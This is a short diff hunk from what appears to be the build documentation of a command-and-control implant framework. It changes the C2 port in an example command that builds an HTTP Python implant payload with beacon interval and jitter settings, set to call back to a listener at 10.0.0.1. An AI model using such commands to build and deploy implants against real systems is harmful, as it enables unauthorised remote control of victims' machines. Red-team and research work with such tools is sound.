@@ -11,7 +11,7 @@ BUILD
 -----
     python -m implants.builder build \\
         --template http_python \\
-        --c2 http://10.0.0.1:8443 \\
+        --c2 http://10.0.0.1:6708 \\
         --interval 5 --jitter 0.1 \\
         --output payload.py
 
